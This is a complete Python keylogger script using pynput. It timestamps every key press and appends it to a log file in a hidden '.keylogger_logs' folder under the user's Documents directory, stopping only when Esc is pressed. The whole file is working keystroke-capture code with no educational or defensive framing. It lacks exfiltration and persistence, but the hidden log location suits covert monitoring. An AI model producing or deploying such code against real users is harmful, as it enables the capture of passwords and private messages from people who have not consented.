from pynput.keyboard import Key, Listener
import os
import time

# Log file directory and name
LOG_DIR = os.path.join(os.path.expanduser("~"), "Documents", ".keylogger_logs")
LOG_FILE = os.path.join(LOG_DIR, "keylog.txt")

# Ensure log directory exists
os.makedirs(LOG_DIR, exist_ok=True)

# Check if the directory was created
if os.path.exists(LOG_DIR):
    print(f"Log directory created at: {LOG_DIR}")
else:
    print(f"Failed to create log directory at: {LOG_DIR}")

# Create or open the log file
def write_to_file(key):
    try:
        # Get current time
        current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

        # Write the key and timestamp to the log file
        with open(LOG_FILE, "a") as file:
            file.write(f"{current_time} - {key}\n")
        print(f"Logged: {key}")  # Debugging output
    except Exception as e:
        print(f"Error writing to log file: {e}")

# Callback for key press events
def on_press(key):
    try:
        # Handle escape key to stop the listener
        if key == Key.esc:
            print("Escape key pressed. Stopping listener...")
            return False  # Stops the listener

        # Convert key to string and remove unwanted characters
        key_str = str(key).replace("'", "")  # Remove the surrounding quotes

        # Handle number keys explicitly to ensure they are logged as numbers
        if key_str in ['Key.space', 'Key.enter', 'Key.tab', 'Key.shift', 'Key.ctrl', 'Key.alt', 'Key.caps_lock', 'Key.esc']:
            key_str = key_str.replace("Key.", "").capitalize()  # Convert to human-readable format
        elif key_str.startswith("Key"):
            key_str = key_str.split('.')[1]  # For special keys like arrow keys, backspace etc.
        
        # Write the key and its time to the log file
        write_to_file(key_str)
    except Exception as e:
        print(f"Error: {e}")

# Callback for key release events (not used in this implementation)
def on_release(key):
    pass  # Not needed for this implementation

# Main keylogger functionality
def main():
    print(f"Keylogger is running... Logs will be saved at {LOG_FILE}")
    print("Press 'Esc' to stop.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
